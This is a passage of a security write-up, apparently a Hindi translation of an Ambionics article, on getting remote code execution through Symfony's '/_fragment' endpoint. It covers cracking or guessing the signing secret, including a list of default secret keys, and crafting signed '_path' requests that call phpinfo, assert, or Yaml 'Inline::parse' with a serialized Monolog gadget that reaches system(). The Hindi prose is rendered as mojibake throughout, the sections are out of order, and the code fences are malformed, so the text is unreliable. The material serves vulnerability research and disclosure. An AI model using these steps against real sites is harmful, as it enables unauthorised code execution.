_рдирдореВрдирд╛ рд▓реЙрдЧ рд╕рд╛рдордЧреНрд░реА: рдЯрд╛рдЗрдорд╕реНрдЯреИрдореНрдк рдЙрд╕реА рдкреНрд░рдХрд╛рд░ рдХрд╛ рд╣реЛрддрд╛ рд╣реИ рдЬреИрд╕рд╛ рдХрд┐ рд░рд╣рд╕реНрдп рдХреА рдЧрдгрдирд╛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░рдпреБрдХреНрдд рд╣реЛрддрд╛ рд╣реИ_

![5](https://www.ambionics.io/images/symfony-secret-fragment/5.png)

рдпрджрд┐ рд▓реЙрдЧреНрд╕ рдЙрдкрд▓рдмреНрдз рдирд╣реАрдВ рд╣реИрдВ, рддреЛ рдХреЛрдИ рд╡реНрдпрдХреНрддрд┐ eZPublish рдХреЗ рдмрд╣реБрдд рд╢рдХреНрддрд┐рд╢рд╛рд▓реА рдЦреЛрдЬ рдЗрдВрдЬрди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╡реЗрдмрд╕рд╛рдЗрдЯ рдХреЗ рдмрд╣реБрдд рдкрд╣рд▓реЗ рддрддреНрд╡ рдХреЗ рдирд┐рд░реНрдорд╛рдг рдХреЗ рд╕рдордп рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛ рд╕рдХрддрд╛ рд╣реИред рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ, рдЬрдм рд╕рд╛рдЗрдЯ рдмрдирд╛рдИ рдЬрд╛рддреА рд╣реИ, рддреЛ рдбреЗрдЯрд╛рдмреЗрд╕ рдореЗрдВ рдмрд╣реБрдд рд╕рд╛рд░реЗ рдЯрд╛рдЗрдорд╕реНрдЯреИрдореНрдк рдбрд╛рд▓реЗ рдЬрд╛рддреЗ рд╣реИрдВред рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ eZPublish рд╡реЗрдмрд╕рд╛рдЗрдЯ рдХреЗ рдкреНрд░рд╛рд░рдВрднрд┐рдХ рдбреЗрдЯрд╛ рдХрд╛ рдЯрд╛рдЗрдорд╕реНрдЯреИрдореНрдк `uniqid()` рдХреА рдЧрдгрдирд╛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░рдпреБрдХреНрдд рд╡рд╣реА рд╣реЛрддрд╛ рд╣реИред рд╣рдо `landing_page` _ContentObject_ рдХреЗ рд▓рд┐рдП рдЦреЛрдЬ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЙрд╕рдХреЗ рдЯрд╛рдЗрдорд╕реНрдЯреИрдореНрдк рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛ рд╕рдХрддреЗ рд╣реИрдВред

## рдЧрд╛рдпрдм рдмрд┐рдЯреНрд╕ рдХреА рдмреНрд░реВрдЯрдлреЛрд░реНрд╕рд┐рдВрдЧ <a href="#bruteforcing-the-missing-bits" id="bruteforcing-the-missing-bits"></a>

рд╣рдореЗрдВ рдЕрдм рд░рд╣рд╕реНрдп рдХреА рдЧрдгрдирд╛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░рдпреБрдХреНрдд рдЯрд╛рдЗрдорд╕реНрдЯреИрдореНрдк рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдкрддрд╛ рдЪрд▓ рдЧрдпрд╛ рд╣реИ, рд╕рд╛рде рд╣реА рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд░реВрдк рдХрд╛ рд╣реИрд╢ рднреА:
```php
$random_value = mt_rand();
$timestamp_hex = sprintf("%08x%05x", $known_timestamp, $microseconds);
$known_plaintext = '<intention><sessionID>';
$known_hash = sha1(sha1(mt_rand() . $timestamp_hex) . $known_plaintext);
```
рдЗрд╕рд╕реЗ рд╣рдореЗрдВ рдХреБрд▓ 231 \* 106 рд╕рдВрднрд╛рд╡рдирд╛рдПрдБ рдорд┐рд▓рддреА рд╣реИрдВред [hashcat](https://hashcat.net) рдФрд░ рдЕрдЪреНрдЫреЗ GPUs рдХреЗ рд╕рд╛рде рдпрд╣ рдХрд░рдирд╛ рд╕рдВрднрд╡ рд▓рдЧрддрд╛ рд╣реИ, рдкрд░рдВрддреБ hashcat `sha1(sha1($pass).$salt)` рдХрд░реНрдиреЗрд▓ рдкреНрд░рджрд╛рди рдирд╣реАрдВ рдХрд░рддрд╛ред рд╕реМрднрд╛рдЧреНрдп рд╕реЗ, рд╣рдордиреЗ рдЗрд╕реЗ рд▓рд╛рдЧреВ рдХрд┐рдпрд╛ рд╣реИ! рдЖрдк [рдпрд╣рд╛рдБ рдкреБрд▓-рд░рд┐рдХреНрд╡реЗрд╕реНрдЯ рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ](https://github.com/hashcat/hashcat/pull/2536)ред

рд╣рдорд╛рд░реА рдХреНрд░реИрдХрд┐рдВрдЧ рдорд╢реАрди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реБрдП, рдЬрд┐рд╕рдореЗрдВ 8 GPUs рд╣реИрдВ, рд╣рдо рдЗрд╕ рд╣реИрд╢ рдХреЛ _20 рдШрдВрдЯреЛрдВ рд╕реЗ рдХрдо рд╕рдордп рдореЗрдВ_ рдХреНрд░реИрдХ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

рд╣реИрд╢ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рдмрд╛рдж, рд╣рдо `/_fragment` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдХреЛрдб рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

## рдирд┐рд╖реНрдХрд░реНрд╖ <a href="#conclusion" id="conclusion"></a>

Symfony рдЕрдм рдХрдИ PHP рдПрдкреНрд▓рд┐рдХреЗрд╢рдиреНрд╕ рдХрд╛ рдореБрдЦреНрдп рдШрдЯрдХ рдмрди рдЧрдпрд╛ рд╣реИред рдЗрд╕ рдкреНрд░рдХрд╛рд░, рдлреНрд░реЗрдорд╡рд░реНрдХ рдХреЛ рдкреНрд░рднрд╛рд╡рд┐рдд рдХрд░рдиреЗ рд╡рд╛рд▓рд╛ рдХреЛрдИ рднреА рд╕реБрд░рдХреНрд╖рд╛ рдЬреЛрдЦрд┐рдо рдмрд╣реБрдд рд╕рд╛рд░реА рд╡реЗрдмрд╕рд╛рдЗрдЯреЛрдВ рдХреЛ рдкреНрд░рднрд╛рд╡рд┐рдд рдХрд░рддрд╛ рд╣реИред рдЗрд╕ рд▓реЗрдЦ рдореЗрдВ рджрд┐рдЦрд╛рдпрд╛ рдЧрдпрд╛ рд╣реИ, рдпрд╛ рддреЛ рдПрдХ рдХрдордЬреЛрд░ рд╕реАрдХреНрд░реЗрдЯ рдпрд╛ рдХрдо рдкреНрд░рднрд╛рд╡ рд╡рд╛рд▓реА рднреЗрджреНрдпрддрд╛ рд╣рдорд▓рд╛рд╡рд░реЛрдВ рдХреЛ **рд░рд┐рдореЛрдЯ рдХреЛрдб рдирд┐рд╖реНрдкрд╛рджрди** рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИред

рдПрдХ рдмреНрд▓реВ рдЯреАрдорд░ рдХреЗ рд░реВрдк рдореЗрдВ, рдЖрдкрдХреЛ рдЕрдкрдиреА рд╣рд░ рдПрдХ Symfony-рдирд┐рд░реНрднрд░ рд╡реЗрдмрд╕рд╛рдЗрдЯ рдкрд░ рдирдЬрд░ рд░рдЦрдиреА рдЪрд╛рд╣рд┐рдПред рдЕрджреНрдпрддрди рд╕реЙрдлреНрдЯрд╡реЗрдпрд░ рдХреЛ рднреЗрджреНрдпрддрд╛рдУрдВ рдХреЗ рд▓рд┐рдП рдмрд╛рд╣рд░ рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдХреНрдпреЛрдВрдХрд┐ рд╕реАрдХреНрд░реЗрдЯ рдХреА рдкрд╣рд▓реА рдмрд╛рд░ рдЙрддреНрдкрд╛рдж рдХреА рд╕реНрдерд╛рдкрдирд╛ рдХреЗ рд╕рдордп рдЙрддреНрдкрдиреНрди рдХреА рдЬрд╛рддреА рд╣реИред рдЗрд╕рд▓рд┐рдП, рдпрджрд┐ рдЖрдкрдиреЗ рдХреБрдЫ рд╡рд░реНрд╖реЛрдВ рдкрд╣рд▓реЗ Symfony-3.x-рдЖрдзрд╛рд░рд┐рдд рд╡реЗрдмрд╕рд╛рдЗрдЯ рдмрдирд╛рдИ рдереА, рдФрд░ рдЗрд╕реЗ рд░рд╛рд╕реНрддреЗ рдореЗрдВ рдЕрджреНрдпрддрди рд░рдЦрд╛, рддреЛ рд╕рдВрднрд╛рд╡рдирд╛ рд╣реИ рдХрд┐ рд╕реАрдХреНрд░реЗрдЯ рдХреА рдЕрднреА рднреА рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд╡рд╛рд▓реА рд╣реИред

## рд╢реЛрд╖рдг <a href="#exploitation" id="exploitation"></a>

### рд╕рд┐рджреНрдзрд╛рдВрдд <a href="#theory" id="theory"></a>

рдкрд╣рд▓реА рдУрд░, рд╣рдореЗрдВ рдЗрд╕ рднреЗрджреНрдпрддрд╛ рдХрд╛ рд╢реЛрд╖рдг рдХрд░рддреЗ рд╕рдордп рдХреБрдЫ рдЪреАрдЬреЛрдВ рдХреА рдЪрд┐рдВрддрд╛ рдХрд░рдиреА рд╣реЛрдЧреА:

* HMAC **рдкреВрд░реЗ URL** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЧрдгрдирд╛ рдХреА рдЬрд╛рддреА рд╣реИред рдпрджрд┐ рд╡реЗрдмрд╕рд╛рдЗрдЯ рдПрдХ рд░рд┐рд╡рд░реНрд╕ рдкреНрд░реЙрдХреНрд╕реА рдХреЗ рдкреАрдЫреЗ рд╣реИ, рддреЛ рд╣рдореЗрдВ рдЕрдкрдиреЗ рдкреЗрд▓реЛрдб рдХреЛ рднреЗрдЬрдиреЗ рд╡рд╛рд▓реЗ URL рдХреЗ рдмрдЬрд╛рдп рд╕реЗрд╡рд╛ рдХреЗ рдЖрдВрддрд░рд┐рдХ URL рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рд╣реЛрдЧрд╛ред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдЖрдВрддрд░рд┐рдХ URL HTTP рдХреЗ рдмрдЬрд╛рдп HTTPS рдкрд░ рд╣реЛ рд╕рдХрддрд╛ рд╣реИред
* HMAC рдХреА рдПрд▓реНрдЧреЛрд░рд┐рдердо рд╡рд░реНрд╖реЛрдВ рдореЗрдВ рдмрджрд▓ рдЧрдИ рд╣реИ: рдкрд╣рд▓реЗ **SHA-1** рдереА, рдФрд░ рдЕрдм **SHA-256** рд╣реИред
* рдЪреВрдВрдХрд┐ Symfony `_hash` рдкреИрд░рд╛рдореАрдЯрд░ рдХреЛ рдЕрдиреБрд░реЛрдз рд╕реЗ рд╣рдЯрд╛ рджреЗрддрд╛ рд╣реИ, рдФрд░ рдлрд┐рд░ URL рдХреЛ рдлрд┐рд░ рд╕реЗ рдЙрддреНрдкрдиреНрди рдХрд░рддрд╛ рд╣реИ, рд╣рдореЗрдВ рдЙрд╕реА URL рдкрд░ рд╣реИрд╢ рдХреА рдЧрдгрдирд╛ рдХрд░рдиреА рд╣реЛрдЧреА рдЬреИрд╕рд╛ рдХрд┐ рдпрд╣ рдХрд░рддрд╛ рд╣реИред
* рдмрд╣реБрдд рд╕рд╛рд░реЗ рд╕реАрдХреНрд░реЗрдЯреНрд╕ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП рд╣рдореЗрдВ рдЙрди рд╕рднреА рдХреА рдЬрд╛рдВрдЪ рдХрд░рдиреА рд╣реЛрдЧреАред
* рдХреБрдЫ PHP рд╕рдВрд╕реНрдХрд░рдгреЛрдВ рдореЗрдВ, рд╣рдо "рдмрд╛рдп-рд░реЗрдлрд░реЗрдВрд╕" рдкреИрд░рд╛рдореАрдЯрд░ рд╡рд╛рд▓реЗ рдлрдВрдХреНрд╢рдиреНрд╕ рдХреЛ рдХреЙрд▓ рдирд╣реАрдВ рдХрд░ рд╕рдХрддреЗ, рдЬреИрд╕реЗ рдХрд┐ `system($command, &$return_value)`ред
* рдХреБрдЫ Symfony рд╕рдВрд╕реНрдХрд░рдгреЛрдВ рдореЗрдВ, `_controller` рдПрдХ рдлрдВрдХреНрд╢рди рдирд╣реАрдВ рд╣реЛ рд╕рдХрддрд╛, рдЗрд╕реЗ рдПрдХ рдореЗрдердб рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдПред рд╣рдореЗрдВ рдПрдХ Symfony рдореЗрдердб рдвреВрдБрдврдирд╛ рд╣реЛрдЧрд╛ рдЬреЛ рд╣рдореЗрдВ рдХреЛрдб рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред

рджреВрд╕рд░реА рдУрд░, рд╣рдо рдХреБрдЫ рдЪреАрдЬреЛрдВ рдХрд╛ рдлрд╛рдпрджрд╛ рдЙрдард╛ рд╕рдХрддреЗ рд╣реИрдВ:

* `/_fragment` рдкрд░ рдХреЛрдИ рдкреИрд░рд╛рдореАрдЯрд░ рдирд╣реАрдВ рд╣реЛрдиреЗ рдкрд░, рдпрд╛ рдПрдХ рдЕрдорд╛рдиреНрдп рд╣реИрд╢ рдХреЗ рд╕рд╛рде рд╣рд┐рдЯ рдХрд░рдиреЗ рдкрд░, рдПрдХ `403` рд╡рд╛рдкрд╕ рдЖрдирд╛ рдЪрд╛рд╣рд┐рдПред
* `/_fragment` рдкрд░ рдПрдХ рдорд╛рдиреНрдп рд╣реИрд╢ рдХреЗ рд╕рд╛рде рд▓реЗрдХрд┐рди рдПрдХ рдорд╛рдиреНрдп рдХрдВрдЯреНрд░реЛрд▓рд░ рдХреЗ рдмрд┐рдирд╛ рд╣рд┐рдЯ рдХрд░рдиреЗ рдкрд░ `500` рдХрд╛ рдкрд░рд┐рдгрд╛рдо рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдПред

рдЖрдЦрд┐рд░реА рдмрд┐рдВрджреБ рд╣рдореЗрдВ рдмрд╛рдж рдореЗрдВ рдХреМрди рд╕рд╛ рдлрдВрдХреНрд╢рди рдпрд╛ рдореЗрдердб рдХреЙрд▓ рдХрд░рдиреЗ рдЬрд╛ рд░рд╣реЗ рд╣реИрдВ, рдЗрд╕рдХреА рдЪрд┐рдВрддрд╛ рдХрд┐рдП рдмрд┐рдирд╛ рд╕реАрдХреНрд░реЗрдЯ рдорд╛рдиреЛрдВ рдХрд╛ рдкрд░реАрдХреНрд╖рдг рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред

### рд╡реНрдпрд╡рд╣рд╛рд░ <a href="#practice" id="practice"></a>

рдорд╛рди рд▓реАрдЬрд┐рдП рд╣рдо `https://target.com/_fragment` рдкрд░ рд╣рдорд▓рд╛ рдХрд░ рд░рд╣реЗ рд╣реИрдВред рдПрдХ URL рдХреЛ рдареАрдХ рд╕реЗ рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рд╣рдореЗрдВ рдЬреНрдЮрд╛рди рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ:

* рдЖрдВрддрд░рд┐рдХ URL: рдпрд╣ `https://target.com/_fragment` рд╣реЛ рд╕рдХрддрд╛ рд╣реИ, рдпрд╛ рд╢рд╛рдпрдж `http://target.com/_fragment`, рдпрд╛ рдлрд┐рд░ рдХреБрдЫ рдмрд┐рд▓рдХреБрд▓ рдЕрд▓рдЧ (_рдЙрджрд╛._ `http://target.website.internal`), рдЬрд┐рд╕реЗ рд╣рдо рдЕрдиреБрдорд╛рди рдирд╣реАрдВ рд▓рдЧрд╛ рд╕рдХрддреЗ
* рд╕реАрдХреНрд░реЗрдЯ рдХреА: рд╣рдорд╛рд░реЗ рдкрд╛рд╕ рд╕рд╛рдорд╛рдиреНрдп рд╕реАрдХреНрд░реЗрдЯ рдХреАрдЬрд╝ рдХреА рдПрдХ рд╕реВрдЪреА рд╣реИ, рдЬреИрд╕реЗ рдХрд┐ `ThisTokenIsNotSoSecretChangeIt`, `ThisEzPlatformTokenIsNotSoSecret_PleaseChangeIt`, рдЖрджрд┐ред
* рдПрд▓реНрдЧреЛрд░рд┐рдердо: SHA1 рдпрд╛ SHA256

рд╣рдореЗрдВ рдЕрднреА рддрдХ рдкреНрд░рднрд╛рд╡реА рдкреЗрд▓реЛрдб ( `_path` рдХреА рд╕рд╛рдордЧреНрд░реА) рдХреА рдЪрд┐рдВрддрд╛ рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд╣реАрдВ рд╣реИ, рдХреНрдпреЛрдВрдХрд┐ рдареАрдХ рд╕реЗ рд╣рд╕реНрддрд╛рдХреНрд╖рд░рд┐рдд URL `AccessDeniedHttpException` рдлреЗрдВрдХрдиреЗ рдХрд╛ рдХрд╛рд░рдг рдирд╣реАрдВ рдмрдиреЗрдЧрд╛, рдФрд░ рдЗрд╕ рддрд░рд╣ `403` рдХрд╛ рдкрд░рд┐рдгрд╛рдо рдирд╣реАрдВ рд╣реЛрдЧрд╛ред рдЗрд╕рд▓рд┐рдП рд╢реЛрд╖рдг `(algorithm, URL, secret)` рд╕рдВрдпреЛрдЬрди рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░реЗрдЧрд╛, рдПрдХ URL рдЙрддреНрдкрдиреНрди рдХрд░реЗрдЧрд╛, рдФрд░ рдЬрд╛рдВрдЪ рдХрд░реЗрдЧрд╛ рдХрд┐ рдХреНрдпрд╛ рдпрд╣ `403` рд╕реНрдерд┐рддрд┐ рдХреЛрдб рдирд╣реАрдВ рджреЗрддрд╛ рд╣реИред

`/_fragment` рдХреЗ рд▓рд┐рдП рдПрдХ рдорд╛рдиреНрдп рдЕрдиреБрд░реЛрдз, `_path` рдкреИрд░рд╛рдореАрдЯрд░ рдХреЗ рдмрд┐рдирд╛

![6](https://www.ambionics.io/images/symfony-secret-fragment/6.png)

рдЗрд╕ рдмрд┐рдВрджреБ рдкрд░, рд╣рдо рдХрд┐рд╕реА рднреА `/_fragment` URL рдХреЛ рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдЬрд┐рд╕рдХрд╛ рдЕрд░реНрде рд╣реИ рдпрд╣ рдПрдХ рдЧрд╛рд░рдВрдЯреАрдб RCE рд╣реИред рдпрд╣ рд╕рд┐рд░реНрдл рдЗрд╕ рдмрд╛рдд рдХреА рдмрд╛рдд рд╣реИ рдХрд┐ рдХреНрдпрд╛ рдХреЙрд▓ рдХрд░рдирд╛ рд╣реИред

рдлрд┐рд░, рд╣рдореЗрдВ рдпрд╣ рдкрддрд╛ рд▓рдЧрд╛рдирд╛ рд╣реЛрдЧрд╛ рдХрд┐ рдХреНрдпрд╛ рд╣рдо рд╕реАрдзреЗ рдПрдХ рдлрдВрдХреНрд╢рди рдХреЙрд▓ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдпрд╛ рд╣рдореЗрдВ рдПрдХ рдХреНрд▓рд╛рд╕ рдореЗрдердб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рд╣реЛрдЧрд╛ред рд╣рдо рдкрд╣рд▓реЗ рд╕рдмрд╕реЗ рд╕реАрдзрд╛ рддрд░реАрдХрд╛ рдЖрдЬрдорд╛ рд╕рдХрддреЗ рд╣реИрдВ, рдЬреИрд╕реЗ рдХрд┐ `phpinfo ([ int $what = INFO_ALL ] )` ([рджрд╕реНрддрд╛рд╡реЗрдЬрд╝реАрдХрд░рдг](https://www.php.net/manual/en/function.phpinfo.php)) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ред `_path` GET рдкреИрд░рд╛рдореАрдЯрд░ рдЗрд╕ рддрд░рд╣ рджрд┐рдЦреЗрдЧрд╛:
```
_controller=phpinfo
&what=-1
```
URL рдЗрд╕ рддрд░рд╣ рджрд┐рдЦреЗрдЧрд╛:

`http://target.com/_fragment?_path=_controller%3Dphpinfo%26what%3D-1&_hash=...`

рдпрджрд┐ HTTP рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдореЗрдВ `phpinfo()` рдкреГрд╖реНрда рдкреНрд░рджрд░реНрд╢рд┐рдд рд╣реЛрддрд╛ рд╣реИ, рддреЛ рд╣рдо рдЬреАрдд рдЧрдПред рдлрд┐рд░ рд╣рдо рджреВрд╕рд░реЗ рдлрдВрдХреНрд╢рди рдХрд╛ рдкреНрд░рдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдЬреИрд╕реЗ рдХрд┐ `assert`:

_`_controller=assert` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реБрдП рдирдореВрдирд╛ рдЖрдЙрдЯрдкреБрдЯ_

![7](https://www.ambionics.io/images/symfony-secret-fragment/7.png)

рдЕрдиреНрдпрдерд╛, рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рд╣рдореЗрдВ рдХрд┐рд╕реА рдХреНрд▓рд╛рд╕ рдореЗрдердб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рд╣реЛрдЧрд╛ред рдЗрд╕рдХреЗ рд▓рд┐рдП рдПрдХ рдЕрдЪреНрдЫрд╛ рдЙрдореНрдореАрджрд╡рд╛рд░ рд╣реИ `Symfony\Component\Yaml\Inline::parse`, рдЬреЛ рдХрд┐ рдПрдХ рдмрд┐рд▓реНрдЯ-рдЗрди Symfony рдХреНрд▓рд╛рд╕ рд╣реИ, рдФрд░ рдЗрд╕ рддрд░рд╣ Symfony рд╡реЗрдмрд╕рд╛рдЗрдЯреЛрдВ рдкрд░ рдореМрдЬреВрдж рд╣реИред

рд╕реНрдкрд╖реНрдЯ рд░реВрдк рд╕реЗ, рдпрд╣ рдореЗрдердб рдПрдХ YAML рдЗрдирдкреБрдЯ рд╕реНрдЯреНрд░рд┐рдВрдЧ рдХреЛ рдкрд╛рд░реНрд╕ рдХрд░рддрд╛ рд╣реИред Symfony рдХрд╛ [YAML](https://yaml.org) рдкрд╛рд░реНрд╕рд░ `php/object` рдЯреИрдЧ рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рддрд╛ рд╣реИ, рдЬреЛ рдХрд┐ рдПрдХ рд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬреНрдб рдЗрдирдкреБрдЯ рд╕реНрдЯреНрд░рд┐рдВрдЧ рдХреЛ `unserialize()` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ рдСрдмреНрдЬреЗрдХреНрдЯ рдореЗрдВ рдмрджрд▓ рджреЗрдЧрд╛ред рдЗрд╕рд╕реЗ рд╣рдореЗрдВ рд╣рдорд╛рд░реЗ рдкрд╕рдВрджреАрджрд╛ PHP рдЯреВрд▓, [PHPGGC](https://github.com/ambionics/phpggc) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рдорд┐рд▓рддреА рд╣реИ!

рдореЗрдердб рдкреНрд░реЛрдЯреЛрдЯрд╛рдЗрдк рд╡рд░реНрд╖реЛрдВ рдореЗрдВ рдмрджрд▓ рдЧрдпрд╛ рд╣реИред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдпрд╣рд╛рдБ рддреАрди рдЕрд▓рдЧ-рдЕрд▓рдЧ рдкреНрд░реЛрдЯреЛрдЯрд╛рдЗрдк рд╣реИрдВ:
```
public static function parse($value, $flags, $references);
public static function parse($value, $exceptionOnInvalidType, $objectSupport);
public static function parse($value, $exceptionOnInvalidType, $objectSupport, $objectForMap, $references);
```
```markdown
рдЗрдирдореЗрдВ рд╕реЗ рдкреНрд░рддреНрдпреЗрдХ рдХреЗ рд▓рд┐рдП `_path` рдмрдирд╛рдиреЗ рдХреЗ рдмрдЬрд╛рдп, рд╣рдо рдЗрд╕ рддрдереНрдп рдХрд╛ рд▓рд╛рдн рдЙрдард╛ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рдпрджрд┐ рд╣рдо рдХреЛрдИ рдРрд╕рд╛ рддрд░реНрдХ рджреЗрддреЗ рд╣реИрдВ рдЬрд┐рд╕рдХрд╛ рдирд╛рдо рд╡рд┐рдзрд┐ рдкреНрд░реЛрдЯреЛрдЯрд╛рдЗрдк рд╕реЗ рдореЗрд▓ рдирд╣реАрдВ рдЦрд╛рддрд╛ рд╣реИ, рддреЛ рдЙрд╕реЗ рдЕрдирджреЗрдЦрд╛ рдХрд░ рджрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ред рдЗрд╕рд▓рд┐рдП рд╣рдо рд╡рд┐рдзрд┐ рдореЗрдВ рд╣рд░ рд╕рдВрднрд╡ рддрд░реНрдХ рдЬреЛрдбрд╝ рд╕рдХрддреЗ рд╣реИрдВ, рд╡рд╛рд╕реНрддрд╡рд┐рдХ рдкреНрд░реЛрдЯреЛрдЯрд╛рдЗрдк рдХреА рдЪрд┐рдВрддрд╛ рдХрд┐рдП рдмрд┐рдирд╛ред

рд╣рдо рдЗрд╕ рдкреНрд░рдХрд╛рд░ `_path` рдХрд╛ рдирд┐рд░реНрдорд╛рдг рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```
```
_controller=Symfony\Component\Yaml\Inline::parse
&value=!php/object O:32:"Monolog\Handler\SyslogUdpHandler":...
&flags=516
&exceptionOnInvalidType=0
&objectSupport=1
&objectForMap=0
&references=
&flags=516
```
```
рд╣рдо `phpinfo()` рдХреЗ рд╕рд╛рде рдкреНрд░рдпрд╛рд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдФрд░ рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рдХреНрдпрд╛ рдпрд╣ рдХрд╛рдо рдХрд░рддрд╛ рд╣реИред рдЕрдЧрд░ рдпрд╣ рдХрд╛рдо рдХрд░рддрд╛ рд╣реИ, рддреЛ рд╣рдо `system()` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

_рд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬреНрдб рдкреЗрд▓реЛрдб рдХреЗ рд╕рд╛рде `Inline::parse` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реБрдП рдирдореВрдирд╛ рдЖрдЙрдЯрдкреБрдЯ_

![8](https://www.ambionics.io/images/symfony-secret-fragment/8.png)

рдЗрд╕рд▓рд┐рдП рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ рд╣рд░ рд╕рдВрднрд╡ рд╡реЗрд░рд┐рдПрдмрд▓ рд╕рдВрдпреЛрдЬрди рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЪрд▓реЗрдЧрд╛, рдФрд░ рдлрд┐рд░ рджреЛ рд╢реЛрд╖рдг рд╡рд┐рдзрд┐рдпреЛрдВ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░реЗрдЧрд╛ред рдХреЛрдб [рд╣рдорд╛рд░реЗ GitHub](https://github.com/ambionics/symfony-exploits) рдкрд░ рдЙрдкрд▓рдмреНрдз рд╣реИред

## рд╕рд┐рдореНрдлрдиреА /\_рдкреНрд░реЛрдлрд╛рдЗрд▓рд░ рдЬрд╛рдирдХрд╛рд░реА рддрдХ рдкрд╣реБрдБрдЪрдирд╛

![f:id:flattsecurity:20201021204553p:plain](https://cdn-ak.f.st-hatena.com/images/fotolife/f/flattsecurity/20201021/20201021204553.png)

рдЬреИрд╕рд╛ рдХрд┐ рдЖрдк рдКрдкрд░ рдХреЗ рд╕реНрдХреНрд░реАрдирд╢реЙрдЯ рдореЗрдВ рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ, рдкреГрд╖реНрда рдХреЗ рджрд╛рд╣рд┐рдиреЗ рдирд┐рдЪрд▓реЗ рд╣рд┐рд╕реНрд╕реЗ рдореЗрдВ `sf` рд▓реЛрдЧреЛ рд╣реИред рдпрд╣ рд▓реЛрдЧреЛ рддрдм рджрд┐рдЦрд╛рдИ рджреЗрддрд╛ рд╣реИ рдЬрдм рд╕рд┐рдореНрдлрдиреА рдбреАрдмрдЧ рдореЛрдб рдХреЗ рдЕрдВрддрд░реНрдЧрдд рд╣реЛрддрд╛ рд╣реИред рдХреБрдЫ рдорд╛рдорд▓реЛрдВ рдореЗрдВ рдпрд╣ рд▓реЛрдЧреЛ рдирд╣реАрдВ рджрд┐рдЦрд╛рдИ рджреЗрддрд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП `/_profiler` рддрдХ рдкрд╣реБрдБрдЪрдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░реЗрдВ рдФрд░ рдЖрдк рдиреАрдЪреЗ рджрд┐рдЦрд╛рдП рдЧрдП рдкреГрд╖реНрда рдХреЛ рджреЗрдЦреЗрдВрдЧреЗ

